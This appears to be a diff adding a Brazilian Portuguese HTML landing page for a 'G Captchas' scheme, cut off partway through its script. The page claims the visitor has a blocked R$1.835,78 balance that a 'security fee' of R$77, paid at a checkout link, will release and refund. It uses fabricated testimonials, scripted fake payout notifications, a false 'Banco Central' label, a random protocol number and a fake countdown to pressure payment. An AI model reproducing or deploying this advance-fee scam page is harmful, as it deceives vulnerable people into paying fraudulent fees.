@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Verified - C6</title>
+
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '934970242377343');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=934970242377343&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+
+
+    <script>!function (i, n) { i._plt = i._plt || (n && n.timeOrigin ? n.timeOrigin + n.now() : Date.now()) }(window, performance);</script>
+    <link rel="preload"
+        href="https://scripts.converteai.net/cb8f52fa-baf7-47da-8386-714b539dd984/players/66da17ac58b6bb000b5713b2/v4/player.js"
+        as="script">
+    <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+    <link rel="preload"
+        href="https://cdn.converteai.net/cb8f52fa-baf7-47da-8386-714b539dd984/66da178bf605a6000b9fa0f7/main.m3u8"
+        as="fetch">
+    <link rel="dns-prefetch" href="https://cdn.converteai.net">
+    <link rel="dns-prefetch" href="https://scripts.converteai.net">
+    <link rel="dns-prefetch" href="https://images.converteai.net">
+    <link rel="dns-prefetch" href="https://api.vturb.com.br">
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- Font Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap"
+        rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #F0F2F5;
+            /* Matches delayed content bg */
+            -webkit-font-smoothing: antialiased;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Video Section Styles to replicate Elementor */
+        .header-content {
+            background-color: #ffffff;
+            padding: 20px 10px;
+        }
+
+        /* Estilos da Barra do Video */
+        .progress-wrapper {
+            width: 100%;
+            max-width: 600px;
+            margin: 10px auto;
+            padding: 0 10px;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif, Arial;
+        }
+
+        .progress-track {
+            background-color: #e0e0e0;
+            border-radius: 20px;
+            height: 25px;
+            width: 100%;
+            overflow: hidden;
+            position: relative;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .progress-fill {
+            background-color: #34A853;
+            height: 100%;
+            border-radius: 20px;
+            width: 0%;
+            transition: width 1.5s ease-out;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+        }
+
+        .video-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        /* Custom Animations from Delayed Block */
+        @keyframes marquee {
+            0% {
+                transform: translateX(0);
+            }
+
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .animate-marquee {
+            animation: marquee 30s linear infinite;
+        }
+
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%);
+            }
+
+            100% {
+                transform: translateX(100%);
+            }
+        }
+
+        .animate-shimmer {
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes bounce-slow {
+
+            0%,
+            100% {
+                transform: translateY(-5%);
+            }
+
+            50% {
+                transform: translateY(5%);
+            }
+        }
+
+        .animate-bounce-slow {
+            animation: bounce-slow 2s infinite;
+        }
+
+        /* Safe area for mobile footer */
+        .pb-safe {
+            padding-bottom: env(safe-area-inset-bottom);
+        }
+
+        /* Pop-ups de comentários G Captchas */
+        #comment-popups {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 9999;
+            pointer-events: none;
+            font-family: "Helvetica Neue", Arial, sans-serif
+        }
+
+        .comment-popup {
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, .15);
+            padding: 14px 16px;
+            margin-top: 12px;
+            width: 280px;
+            max-width: 80vw;
+            opacity: 0;
+            transform: translateY(60px);
+            transition: opacity .6s ease, transform .6s ease;
+            display: flex;
+            gap: 12px;
+            pointer-events: auto
+        }
+
+        .comment-popup.show {
+            opacity: 1;
+            transform: translateY(0)
+        }
+
+        .comment-popup .avatar {
+            flex: 0 0 44px;
+            height: 44px;
+            width: 44px;
+            border-radius: 50%;
+            object-fit: cover
+        }
+
+        .comment-popup .text {
+            font-size: 15px;
+            line-height: 1.35
+        }
+
+        .comment-popup .time {
+            display: block;
+            font-size: 12px;
+            color: #6d6d6d;
+            margin-top: 4px
+        }
+    </style>
+</head>
+
+<body class="pb-44 md:pb-10 relative overflow-x-hidden selection:bg-green-200 text-slate-800 bg-[#F0F2F5]">
+
+    <!-- Progress Bar (No Topo da Página) -->
+    <div class="w-full bg-white py-3 shadow-sm border-b border-gray-200 mb-6">
+        <div class="progress-wrapper !mt-0 !mb-0">
+            <div
+                style="display: flex; justify-content: space-between; margin-bottom: 5px; color: #555; font-size: 13px; font-weight: bold;">
+                <span>Assista até o final para receber seu saldo!</span>
+                <span id="text-percent">0%</span>
+            </div>
+            <div class="progress-track">
+                <div class="progress-fill" id="my-progress-bar"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN CARD WRAPPER -->
+    <div
+        class="max-w-[850px] mx-auto bg-white rounded-[20px] shadow-sm border border-gray-100 p-5 md:p-8 mb-8 mx-4 md:mx-auto">
+
+        <!-- HEADER DO CARD -->
+        <div class="flex flex-col md:flex-row items-center justify-between pb-6 mb-6 gap-6 md:gap-4">
+            <div class="w-full md:w-auto flex justify-center md:justify-start">
+                <img fetchpriority="high" decoding="async" width="220"
+                    src="https://agoranovo.site/wp-content/uploads/2025/09/Google-Captchas2.png"
+                    alt="Google Captchas" />
+            </div>
+            <div class="flex items-center gap-4">
+                <span class="text-sm md:text-base font-semibold text-gray-600">Seu saldo atual:</span>
+                <div class="bg-[#2e924d] text-white font-extrabold text-xl md:text-2xl py-2 px-5 rounded-lg shadow-sm">
+                    R$1.835,78
+                </div>
+            </div>
+        </div>
+
+        <!-- Títulos Centrais -->
+        <div class="text-center mb-8">
+            <h2
+                class="text-[20px] md:text-[24px] font-black font-['Inter'] text-[#1a237e] uppercase leading-tight mb-4 tracking-tight">
+                Falta pouco para você resgatar o seu saldo total obtido em suas análises...
+            </h2>
+            <h2
+                class="text-[16px] md:text-[18px] font-semibold font-['Inter'] text-gray-700 leading-tight mb-4 tracking-tight">
+                Assista o vídeo abaixo e entenda como sacar... <span
+                    class="bg-blue-600 text-white rounded font-bold px-1.5 py-0.5 text-sm inline-block transform translate-y-[-2px]">⬇️</span>
+            </h2>
+            <div class="inline-flex items-center gap-2 text-sm text-gray-500 font-semibold tracking-tight">
+                <span class="text-lg">🔊</span> Por favor, verifique se seu som está ligado
+            </div>
+        </div>
+
+        <!-- Vimeo Video Embed -->
+        <div
+            class="relative w-full rounded-xl overflow-hidden shadow-lg border-2 border-slate-100 bg-slate-900 aspect-video">
+            <iframe src="https://player.vimeo.com/video/1170138957?share=copy&fl=sv&fe=ci&autoplay=1&muted=1"
+                frameborder="0" allow="autoplay; fullscreen; picture-in-picture"
+                style="position:absolute;top:0;left:0;width:100%;height:100%;" allowfullscreen></iframe>
+        </div>
+
+        <!-- WRAPPER PARA O DELAY -->
+        <div id="delayed-content" style="display: none;">
+
+            <!-- LIVE TICKER TOP BAR -->
+            <div
+                class="bg-slate-900 text-white text-[10px] font-medium py-2 overflow-hidden relative z-50 border-b border-white/10">
+                <div class="whitespace-nowrap flex gap-8 items-center opacity-90 w-max animate-marquee">
+                    <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-green-500"></span>
+                        <strong>Julia S.</strong> recebeu Pix de R$ 1.420,00</span>
+                    <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-green-500"></span>
+                        <strong>Marcos P.</strong> recebeu Pix de R$ 2.250,00</span>
+                    <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-green-500"></span>
+                        <strong>Ana L.</strong> recebeu Pix de R$ 940,00</span>
+                    <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-green-500"></span>
+                        <strong>Pedro H.</strong> recebeu Pix de R$ 1.890,00</span>
+                    <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 rounded-full bg-green-500"></span>
+                        <strong>Carla M.</strong> recebeu Pix de R$ 560,00</span>
+                </div>
+            </div>
+
+            <!-- TOAST NOTIFICATION -->
+            <div id="toast"
+                class="fixed top-28 right-4 z-50 bg-white border-l-4 border-emerald-500 shadow-[0_8px_30px_rgba(0,0,0,0.12)] rounded-lg p-3 flex items-center gap-3 transition-all duration-500 transform translate-x-20 opacity-0">
+                <div class="bg-emerald-100 p-2 rounded-full text-emerald-600 animate-bounce-slow">
+                    <i data-lucide="bell" class="w-4 h-4"></i>
+                </div>
+                <div>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-wide">Notificação de Banco</p>
+                    <p id="toast-message" class="text-xs text-gray-800 font-bold leading-tight">Carregando...</p>
+                </div>
+            </div>
+
+            <!-- HEADER -->
+            <header
+                class="bg-white/90 backdrop-blur-sm shadow-sm border-b border-gray-200 sticky top-0 z-40 transition-all">
+                <div class="container mx-auto px-4 py-3 flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <div
+                            class="w-9 h-9 bg-emerald-600 rounded-xl flex items-center justify-center text-white font-bold text-sm shadow-lg shadow-emerald-600/20">
+                            GC
+                        </div>
+                        <div class="leading-tight">
+                            <span class="font-bold text-gray-900 block text-sm tracking-tight">G Captchas</span>
+                            <span class="text-[10px] text-emerald-600 font-medium flex items-center gap-1">
+                                <i data-lucide="lock" class="w-3 h-3"></i>
+                                <span id="connection-text">Conexão Segura SSL</span>
+                            </span>
+                        </div>
+                    </div>
+
+                    <div
+                        class="w-8 h-8 bg-gray-50 rounded-full border border-gray-200 flex items-center justify-center text-gray-400">
+                        <i data-lucide="shield-check" class="w-4 h-4"></i>
+                    </div>
+                </div>
+
+                <!-- Step Progress -->
+                <div class="bg-white px-6 py-2 border-b border-gray-100">
+                    <div class="flex justify-between items-center max-w-xs mx-auto">
+                        <div class="flex items-center gap-1.5 opacity-50 grayscale">
+                            <div
+                                class="w-4 h-4 rounded-full bg-emerald-500 flex items-center justify-center text-white text-[8px] font-bold">
+                                ✓</div>
+                            <span class="text-[10px] font-medium">Análise</span>
+                        </div>
+                        <div class="h-px w-8 bg-gray-200"></div>
+                        <div class="flex items-center gap-1.5">
+                            <div
+                                class="w-4 h-4 rounded-full bg-emerald-100 border border-emerald-500 flex items-center justify-center relative">
+                                <div class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
+                            </div>
+                            <span class="text-[10px] font-bold text-emerald-700">Liberação</span>
+                        </div>
+                        <div class="h-px w-8 bg-gray-200"></div>
+                        <div class="flex items-center gap-1.5 opacity-40">
+                            <div class="w-4 h-4 rounded-full border border-gray-300 flex items-center justify-center">
+                            </div>
+                            <span class="text-[10px] font-medium">Pix Enviado</span>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <main class="container mx-auto max-w-lg px-4 pt-6">
+
+                <!-- STATUS BANNER -->
+                <div class="bg-amber-50 border border-amber-100 rounded-xl p-4 mb-6 shadow-sm flex items-start gap-3">
+                    <div class="bg-amber-100 p-2 rounded-full text-amber-600 shrink-0 mt-0.5">
+                        <i data-lucide="alert-triangle" class="w-4 h-4"></i>
+                    </div>
+                    <div>
+                        <h2 class="text-amber-900 font-bold text-sm mb-1">Transferência Interrompida</h2>
+                        <p class="text-amber-800/80 text-xs leading-relaxed">
+                            O valor já saiu da conta da empresa e está pendente no gateway. Pague a taxa de segurança
+                            para
+                            liberar o repasse para o seu CPF.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- HERO CARD (BALANCE) -->
+                <div class="relative mb-6">
+                    <div
+                        class="bg-gradient-to-b from-gray-900 to-gray-800 rounded-2xl shadow-xl overflow-hidden border border-gray-700 p-6 text-white relative">
+
+                        <!-- Background Detail -->
+                        <div
+                            class="absolute top-0 right-0 w-32 h-32 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none">
+                        </div>
+
+                        <div class="flex justify-between items-start mb-6">
+                            <div>
+                                <p
+                                    class="text-gray-400 text-[10px] font-medium uppercase tracking-widest mb-1 flex items-center gap-1">
+                                    Saldo Bloqueado <i data-lucide="lock" class="w-3 h-3"></i>
+                                </p>
+                                <div class="flex items-baseline gap-1">
+                                    <span class="text-gray-400 font-light text-lg">R$</span>
+                                    <h1 class="text-4xl font-bold tracking-tight text-white">1.835,78</h1>
+                                </div>
+                            </div>
+                            <div
+                                class="w-10 h-10 bg-white/5 rounded-full flex items-center justify-center border border-white/10">
+                                <i data-lucide="wallet" class="w-5 h-5 text-emerald-400"></i>
+                            </div>
+                        </div>
+
+                        <!-- Transaction Details -->
+                        <div class="bg-white/5 rounded-xl border border-white/5 p-4 space-y-3 backdrop-blur-sm">
+                            <div class="flex justify-between text-xs border-b border-white/5 pb-2">
+                                <span class="text-gray-400">Protocolo</span>
+                                <span class="font-mono text-white flex items-center gap-1">
+                                    <span id="protocol-number">Loading...</span> <i data-lucide="copy"
+                                        class="w-3 h-3 text-gray-500"></i>
+                                </span>
+                            </div>
+                            <div class="flex justify-between text-xs border-b border-white/5 pb-2">
+                                <span class="text-gray-400">Beneficiário</span>
+                                <span class="text-white font-medium">CPF Verificado</span>
+                            </div>
+                            <div class="flex justify-between text-xs border-b border-white/5 pb-2">
+                                <span class="text-gray-400">Instituição</span>
+                                <span class="text-white flex items-center gap-1">
+                                    <i data-lucide="landmark" class="w-3 h-3"></i> Banco Central
+                                </span>
+                            </div>
+                            <div class="flex justify-between text-xs pt-1">
+                                <span class="text-gray-400">Status Atual</span>
+                                <span
+                                    class="text-amber-400 font-bold bg-amber-400/10 px-2 py-0.5 rounded text-[10px] uppercase">
+                                    Aguardando Taxa
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Shadow effect below card -->
+                    <div class="absolute -bottom-4 left-4 right-4 h-4 bg-gray-900/10 blur-xl rounded-full"></div>
+                </div>
+
+                <!-- MATH EXPLANATION -->
+                <div class="mb-8">
+                    <div
+                        class="bg-white border border-gray-100 rounded-2xl p-5 shadow-sm text-center relative overflow-hidden">
+                        <div class="absolute top-0 left-0 w-full h-1 bg-emerald-500"></div>
+
+                        <div
+                            class="inline-block bg-emerald-50 text-emerald-700 px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wide mb-4 border border-emerald-100">
+                            Entenda o Recebimento
+                        </div>
+
+                        <div class="flex justify-center items-center gap-3 mb-4 text-sm">
+                            <div class="flex flex-col items-center">
+                                <span class="font-bold text-gray-800 text-lg">R$ 1.835,78</span>
+                                <span class="text-[9px] text-gray-400 uppercase font-medium">Seu Saldo</span>
+                            </div>
+                            <div class="text-gray-300 pb-4">+</div>
+                            <div class="flex flex-col items-center relative">
+                                <div
+                                    class="absolute -top-3 -right-3 bg-red-500 text-white text-[8px] font-bold px-1.5 py-0.5 rounded-full animate-bounce">
+                                    Volta</div>
+                                <span class="font-bold text-emerald-600 text-lg">R$ 77,00</span>
+                                <span class="text-[9px] text-emerald-600/70 uppercase font-medium">Taxa Devolvida</span>
+                            </div>
+                        </div>
+
+                        <div
+                            class="bg-gray-50 rounded-xl p-3 border border-gray-100 flex items-center justify-between px-6">
+                            <span class="text-[10px] text-gray-500 uppercase font-bold tracking-wide">Valor Final do
+                                Pix</span>
+                            <span class="text-xl font-black text-gray-800 tracking-tight">R$ 1.912,78</span>
+                        </div>
+
+                        <p
+                            class="text-[10px] text-gray-400 mt-3 leading-relaxed max-w-xs mx-auto flex items-center justify-center gap-1">
+                            <i data-lucide="shield-check" class="w-3 h-3"></i>
+                            O valor da taxa de segurança é devolvido automaticamente para sua conta junto com o saldo
+                            desbloqueado.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- MAIN ACTION AREA -->
+                <div class="mb-10">
+                    <div class="flex justify-between items-end mb-2 px-1">
+                        <div class="flex gap-2 items-center">
+                            <span class="relative flex h-2.5 w-2.5">
+                                <span
+                                    class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                                <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
+                            </span>
+                            <span class="text-[11px] font-bold text-red-600 uppercase tracking-wide">Últimas 2
+                                vagas</span>
+                        </div>
+                        <div
+                            class="text-[11px] font-mono text-gray-500 bg-white border border-gray-200 px-2 py-0.5 rounded shadow-sm">
+                            Expira em: <span id="timer-display" class="font-bold text-red-600">05:00</span>
+                        </div>
+                    </div>
+
+                    <a href="https://zuckpay.com.br/checkout/g-captcha"
+                        class="group relative w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-lg py-5 rounded-2xl shadow-[0_8px_30px_rgba(5,150,105,0.3)] transform transition-all active:scale-[0.98] overflow-hidden border-b-4 border-emerald-800 flex items-center justify-center no-underline">
+                        <div
+                            class="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full animate-shimmer">
+                        </div>
+                        <span class="relative flex items-center justify-center gap-3">
+                            <i data-lucide="lock" class="w-5 h-5 text-emerald-100"></i>
+                            DESBLOQUEAR SALDO AGORA
+                            <i data-lucide="arrow-right"
+                                class="w-5 h-5 group-hover:translate-x-1 transition-transform"></i>
+                        </span>
+                    </a>
+
+                    <div class="mt-4 flex justify-center items-center gap-3 text-[10px] text-gray-400">
+                        <span class="flex items-center gap-1"><i data-lucide="wifi" class="w-3 h-3"></i> Ambiente
+                            Seguro</span>
+                        <span class="h-3 w-px bg-gray-300"></span>
+                        <span class="flex items-center gap-1"><i data-lucide="zap" class="w-3 h-3"></i> Processamento
+                            Instantâneo</span>
+                    </div>
+                </div>
+
+                <!-- DEPOIMENTOS -->
+                <div class="mb-12">
+                    <h3
+                        class="font-bold text-gray-900 mb-5 flex items-center gap-2 text-xs uppercase tracking-widest px-1">
+                        <i data-lucide="message-square" class="w-3 h-3 text-emerald-600"></i>
+                        Depoimentos Verificados
+                    </h3>
+
+                    <div class="space-y-4">
+                        <!-- Depoimento 1 -->
+                        <div class="bg-white p-5 rounded-2xl border border-gray-100 shadow-sm relative">
+                            <div class="flex items-start gap-3">
+                                <div
+                                    class="w-10 h-10 rounded-full flex items-center justify-center font-bold text-xs bg-indigo-100 text-indigo-700 shrink-0">
+                                    LS
+                                </div>
+                                <div>
+                                    <div class="flex justify-between items-center mb-1">
+                                        <p class="font-bold text-gray-900 text-sm">Larissa Souza</p>
+                                        <div class="flex text-amber-400 text-[10px]">★★★★★</div>
+                                    </div>
+                                    <p class="text-[10px] text-gray-400 mb-2">Belo Horizonte/MG • Há 2 horas</p>
+                                    <p
+                                        class="text-gray-600 text-xs leading-relaxed bg-gray-50 p-3 rounded-lg rounded-tl-none border border-gray-50">
+                                        "Eu tinha R$ 1.800 acumulado. Paguei a taxa de segurança e em 2 minutos o valor
+                                        total (saldo + taxa) caiu na minha conta Nubank! Podem confiar."
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Depoimento 2 -->
+                        <div class="bg-white p-5 rounded-2xl border border-gray-100 shadow-sm relative">
+                            <div class="flex items-start gap-3">
+                                <div
+                                    class="w-10 h-10 rounded-full flex items-center justify-center font-bold text-xs bg-teal-100 text-teal-700 shrink-0">
+                                    MR
+                                </div>
+                                <div>
+                                    <div class="flex justify-between items-center mb-1">
+                                        <p class="font-bold text-gray-900 text-sm">Marcos Ribeiro</p>
+                                        <div class="flex text-amber-400 text-[10px]">★★★★★</div>
+                                    </div>
+                                    <p class="text-[10px] text-gray-400 mb-2">Recife/PE • Há 4 horas</p>
+                                    <p
+                                        class="text-gray-600 text-xs leading-relaxed bg-gray-50 p-3 rounded-lg rounded-tl-none border border-gray-50">
+                                        "Funciona mesmo. O sistema pede a taxa só pra confirmar que não sou robô, depois
+                                        devolve tudo. Já saquei e estou feliz demais."
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- FAQ SECTION -->
+                <div class="mb-12">
+                    <h3 class="text-center font-bold text-gray-900 mb-6 text-xs uppercase tracking-widest">Central de
+                        Ajuda
+                    </h3>
+                    <div class="space-y-3" id="faq-container">
+                        <!-- FAQ Item 1 -->
+                        <div class="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
+                            <button
+                                class="w-full px-5 py-4 flex items-center justify-between text-left hover:bg-gray-50 transition-colors faq-btn"
+                                data-index="0">
+                                <span class="text-sm font-semibold text-gray-700 pr-4">Por que existe essa Taxa de
+                                    Segurança?</span>
+                                <i data-lucide="chevron-down" class="w-4 h-4 text-gray-400 shrink-0 icon-chevron"></i>
+                            </button>
+                            <div class="px-5 pb-5 pt-0 bg-white hidden faq-content">
+                                <p
+                                    class="text-xs text-gray-500 leading-relaxed mt-2 pl-3 border-l-2 border-emerald-500">
+                                    É uma validação obrigatória anti-fraude para confirmar seu CPF. O valor não é
+                                    cobrado,
+                                    ele fica 'retido' por alguns minutos e retorna integralmente para você junto com o
+                                    saque.
+                                </p>
+                            </div>
+                        </div>
+                        <!-- FAQ Item 2 -->
+                        <div class="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
+                            <button
+                                class="w-full px-5 py-4 flex items-center justify-between text-left hover:bg-gray-50 transition-colors faq-btn"
+                                data-index="1">
+                                <span class="text-sm font-semibold text-gray-700 pr-4">O Pix cai na hora?</span>
+                                <i data-lucide="chevron-down" class="w-4 h-4 text-gray-400 shrink-0 icon-chevron"></i>
+                            </button>
+                            <div class="px-5 pb-5 pt-0 bg-white hidden faq-content">
+                                <p
+                                    class="text-xs text-gray-500 leading-relaxed mt-2 pl-3 border-l-2 border-emerald-500">
+                                    Sim! Nosso sistema tem integração direta via API bancária. Confirmada a taxa
+                                    antibot, o
+                                    lote acumulado é liberado instantaneamente.
+                                </p>
+                            </div>
+                        </div>
+                        <!-- FAQ Item 3 -->
+                        <div class="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
+                            <button
+                                class="w-full px-5 py-4 flex items-center justify-between text-left hover:bg-gray-50 transition-colors faq-btn"
+                                data-index="2">
+                                <span class="text-sm font-semibold text-gray-700 pr-4">Tenho alguma garantia?</span>
+                                <i data-lucide="chevron-down" class="w-4 h-4 text-gray-400 shrink-0 icon-chevron"></i>
+                            </button>
+                            <div class="px-5 pb-5 pt-0 bg-white hidden faq-content">
+                                <p
+                                    class="text-xs text-gray-500 leading-relaxed mt-2 pl-3 border-l-2 border-emerald-500">
+                                    Garantia total de 7 dias. Se tiver qualquer problema, devolvemos seu dinheiro da
+                                    taxa
+                                    sem burocracia.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SECURITY FOOTER -->
+                <div class="text-center py-10 pb-16 bg-white border-t border-gray-100 -mx-4 px-4 mt-8">
+                    <div class="flex justify-center items-center gap-6 mb-6 opacity-40 grayscale">
+                        <i data-lucide="file-text" class="w-5 h-5"></i>
+                        <i data-lucide="shield-check" class="w-5 h-5"></i>
+                        <i data-lucide="landmark" class="w-5 h-5"></i>
+                    </div>
+
+                    <p class="text-[10px] text-gray-400 max-w-xs mx-auto mb-4 leading-relaxed font-medium">
+                        © 2025 G Captchas. Todos os direitos reservados. <br />
+                        Tecnologia de pagamentos processada por Gateway Seguro.
+                    </p>
+
+                    <div class="flex justify-center gap-4 text-[10px] text-gray-400 underline decoration-gray-300">
+                        <a href="#">Termos de Uso</a>
+                        <a href="#">Privacidade</a>
+                        <a href="#">Suporte</a>
+                    </div>
+                </div>
+            </main>
+
+            <!-- STICKY FOOTER -->
+            <div
+                class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-gray-200 px-5 py-3 z-50 md:hidden pb-safe shadow-[0_-4px_20px_rgba(0,0,0,0.05)]">
+                <div class="flex gap-3 items-center">
+                    <div class="flex-1">
+                        <p class="text-[10px] text-gray-500 mb-0.5 uppercase tracking-wide font-bold">Total a Receber:
+                        </p>
+                        <p class="text-xl font-black text-gray-900 leading-none tracking-tight">R$ 1.912,78</p>
+                    </div>
+                    <a href="https://zuckpay.com.br/checkout/g-captcha"
+                        class="bg-emerald-600 text-white font-bold text-xs py-3.5 px-6 rounded-xl shadow-lg shadow-emerald-600/30 active:scale-95 transition-transform flex items-center justify-center gap-2 animate-pulse no-underline">
+                        SACAR <i data-lucide="arrow-right" class="w-3.5 h-3.5"></i>
+                    </a>
+                </div>
+            </div>
+        </div> <!-- END WRAPPER DELAY -->
+
+        <!-- Pop-ups de comentários G Captchas Container -->
+        <div id="comment-popups"></div>
+
+        <script>
+            // --- 1. CONFIGURAÇÃO DA BARRA DE PROGRESSO DO VÍDEO ---
+            const porcentagemDestaPagina = 100;
+
+            document.addEventListener("DOMContentLoaded", function () {
+                const bar = document.getElementById("my-progress-bar");
+                const text = document.getElementById("text-percent");
+
+                setTimeout(() => {
+                    bar.style.width = porcentagemDestaPagina + "%";
+                    text.innerText = porcentagemDestaPagina + "%";
+                    if (porcentagemDestaPagina > 10) {
+                        bar.innerText = porcentagemDestaPagina + "%";
+                        text.innerText = "100% concluído";
+                    }
+                }, 300);
+
+                // --- 2. DELAY LOGIC COM LOCALSTORAGE ---
+                const hasSeenContent = localStorage.getItem('hasSeenContent');
+                const delayTime = 10000; // 10 segundos em ms (alterado para carregar mais rápido)
+
+                if (hasSeenContent) {
+                    document.getElementById('delayed-content').style.display = 'block';
+                    initAllScripts();
+                } else {
+                    setTimeout(() => {
+                        document.getElementById('delayed-content').style.display = 'block';
+                        localStorage.setItem('hasSeenContent', 'true');
+                        initAllScripts();
+                    }, delayTime);
+                }
+            });
+
+            // --- 3. INICIA TODOS OS SCRIPTS APÓS O DELAY ---
+            function initAllScripts() {
+                lucide.createIcons();
+                startTimer();
+                startConnectionAnimation();
+                startToasts();
+                generateProtocol();
+                initAccordion();
+            }
+
+            function startTimer() {
+                let timeLeft = 300;
+                const timerDisplay = document.getElementById('timer-display');
+
+                const timer = setInterval(() => {
+                    if (timeLeft <= 0) {
+                        clearInterval(timer);
+                        timeLeft = 0;
+                    } else {
+                        timeLeft--;
+                    }
+                    const mins = Math.floor(timeLeft / 60);
+                    const secs = timeLeft % 60;
+                    if (timerDisplay) timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                }, 1000);
+            }
+
+            function startConnectionAnimation() {
+                const statusTexts = ["Conexão Segura SSL", "Validando Chave Pix", "Aguardando Confirmação"];
+                let currentIndex = 0;
+                const textElement = document.getElementById('connection-text');
+
+                setInterval(() => {
+                    currentIndex = (currentIndex + 1) % statusTexts.length;
+                    if (textElement) textElement.textContent = statusTexts[currentIndex];
+                }, 3000);
+            }
+
+            function generateProtocol() {
+                const protocol = Math.floor(100000 + Math.random() * 900000);
+                const protElem = document.getElementById('protocol-number');
+                if (protElem) protElem.textContent = `${protocol}-B`;
+            }
+
+            function startToasts() {
+                const notifications = [
+                    { name: "Joana M.", value: "1.417,00" },
+                    { name: "Carlos E.", value: "2.890,50" },
+                    { name: "Fernanda S.", value: "950,00" },
+                    { name: "Roberto A.", value: "1.200,00" },
+                    { name: "Amanda T.", value: "3.150,00" }
+                ];
+
+                const toast = document.getElementById('toast');
+                const toastMessage = document.getElementById('toast-message');
+
+                if (!toast || !toastMessage) return;
+
+                function showRandomToast() {
+                    const notif = notifications[Math.floor(Math.random() * notifications.length)];
+                    toastMessage.textContent = `${notif.name} recebeu R$ ${notif.value}`;
+
+                    toast.classList.remove('translate-x-20', 'opacity-0');
+                    toast.classList.add('translate-x-0', 'opacity-100');
+
+                    setTimeout(() => {
+                        toast.classList.remove('translate-x-0', 'opacity-100');
+                        toast.classList.add('translate-x-20', 'opacity-0');
+                    }, 4000);
+                }
+
+                setInterval(showRandomToast, 10000);
+            }
+
+            function initAccordion() {
+                const btns = document.querySelectorAll('.faq-btn');
+
+                btns.forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        const content = btn.nextElementSibling;
+                        const isHidden = content.classList.contains('hidden');
+
+                        document.querySelectorAll('.faq-content').forEach(el => el.classList.add('hidden'));
+
+                        if (isHidden) {
+                            content.classList.remove('hidden');
+                        }
+                    });
+                });
+            }
+
+            // --- 4. POPUPS DE COMENTÁRIOS ---
+            const comments = [
+                { n: "João S.", t: "Acabei de sacar minha taxa sem problema! 🔒", m: "há 1 min", a: "https://xsgames.co/randomusers/assets/avatars/male/1.jpg" },
+                { n: "Pedro L.", t: "Ganhei R$ 130 hoje só em captchas!", m: "há 3 min", a: "https://xsgames.co/randomusers/assets/avatars/male/2.jpg" },
